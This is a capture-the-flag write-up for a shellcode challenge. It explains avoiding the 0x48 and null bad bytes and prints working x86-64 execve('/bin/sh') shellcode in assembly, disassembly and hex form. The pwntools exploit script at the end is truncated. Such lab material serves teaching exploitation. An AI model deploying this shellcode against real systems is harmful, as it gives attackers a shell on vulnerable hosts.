Level 1

## The Challenge

File can be downloaded [here](/files/level_1/level-1) (Right click and open in new tab).

The goal of this challenge is to provide shellcode that gets executed for a shell.

## Analysis

I ran the executable and sent random output just to see what would happen. When I sent 'h', I received an output `Illegal instruction (core dumped)`. Since it interpreted 'h' as an instruction, I could try to feed it an input that would be a valid instruction.

Using ghidra, I looked in main and found that the executable reads into a buffer of 4096 bytes and then executes it directly in memory. The value `0x48` is treated as a bad byte so I had to create shellcode that would avoid `0x48` and null bytes.

`0x48` is a REX prefix that generally appears in shellcode where certain operations performed on 64 bit registers are used. I used the shellcode from pwntools as a template to start with.

```python3
shellcode = asm(shellcraft.amd64.linux.sh())
```

The above code provides the following shellcode:

```
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push b'/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
/* push argument array ['sh\x00'] */
/* push b'sh\x00' */
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi /* 0 */
push rsi /* null terminate */
push 8
pop rsi
add rsi, rsp
push rsi /* 'sh\x00' */
mov rsi, rsp
xor edx, edx /* 0 */
/* call execve() */
push SYS_execve /* 0x3b */
pop rax
syscall
```

Throwing it into an assembler reveals that there are a few `0x48` bytes that need to be replaced.

```
0:  6a 68                   push   0x68
2:  48 b8 2f 62 69 6e 2f    movabs rax,0x732f2f2f6e69622f
9:  2f 2f 73
c:  50                      push   rax
d:  48 89 e7                mov    rdi,rsp
10: 68 72 69 01 01          push   0x1016972
15: 81 34 24 01 01 01 01    xor    DWORD PTR [rsp],0x1010101
1c: 31 f6                   xor    esi,esi
1e: 56                      push   rsi
1f: 6a 08                   push   0x8
21: 5e                      pop    rsi
22: 48 01 e6                add    rsi,rsp
25: 56                      push   rsi
26: 48 89 e6                mov    rsi,rsp
29: 31 d2                   xor    edx,edx
2b: ff 34 25 00 00 00 00    push   QWORD PTR ds:0x0
32: 58                      pop    rax
33: 0f 05                   syscall
```

I replaced mov operations with pushes and pops in order to get rid of the bad bytes. I also replaced line 2b with `push 0x3b` for the syscall code for execve.

```
push 0x68
mov r15, 0x732f2f2f6e69622f
push r15
push rsp
pop rdi

push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi
push rsi
push 8
pop r14
add r14, rsp
push r14
push rsp
pop rsi
xor edx, edx
push 0x3b
pop rax
syscall
```

Now there are no more bad bytes.

`"\x6A\x68\x49\xBF\x2F\x62\x69\x6E\x2F\x2F\x2F\x73\x41\x57\x54\x5F\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xF6\x56\x6A\x08\x41\x5E\x49\x01\xE6\x41\x56\x54\x5E\x31\xD2\x6A\x3B\x58\x0F\x05"`

I use pwntools to send the payload to the program and successfully obtain a shell.

```python
#!/usr/bin/env python3

    '''Establish the connection to the process, local or remote.

    io = process([exe.path])
    return io


def main():
